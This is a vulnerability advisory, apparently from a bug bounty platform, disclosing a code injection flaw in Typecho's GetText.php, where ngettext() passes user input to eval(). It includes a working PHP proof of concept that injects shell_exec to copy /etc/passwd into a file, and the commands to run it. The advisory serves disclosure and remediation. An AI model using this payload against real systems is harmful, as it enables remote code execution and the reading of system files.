
The select_string() function in GetText.php (typecho/var/Typecho/I18n/GetText.php) is vulnerable to Code Injection. The select_string() function is a private function although it can be accessed via calling the public function `ngettext()` which calls the vulnerable function on line 357. By giving a maliciously crafted payload through the "$number" argument in the ngettext() function, it gets executed via eval() which can be used to execute system commands leading to an RCE (`shell_exec("touch poc.txt");`).

## Description
The function select_string() accepts an argument "n" which is then passed to the PHP's eval() function. The eval() function evaluates a string as PHP code, thus we can craft a malicious PHP code to pass as the argument "n" to the select_string() function which can lead to a Code Injection Vulnerability.

## Proof of Concept (Credit: [mufeedvh](https://app.huntr.dev/users/mufeedvh))
```
<?php

    // Typecho Code Injection PoC (@mufeedvh)

    include 'GetText.php';

    $typeEchoClass = new Typecho_I18n_GetText("poc.php");
    $noice = 69;
    $refer = &$noice;
    $typeEchoClass->ngettext("single", "plural", "shell_exec('cat /etc/passwd > poc.txt')", $refer);

?>
```

Place this file inside the "typecho/var/Typecho/I18n/" path (where the GetText.php file is) and execute it:

    $ php poc.php
    $ cat poc.txt

Now you will be able to see the contents of "/etc/passwd" inside the file created by the exploit.

## References
- [GitHub Issue](https://github.com/typecho/typecho/issues/936)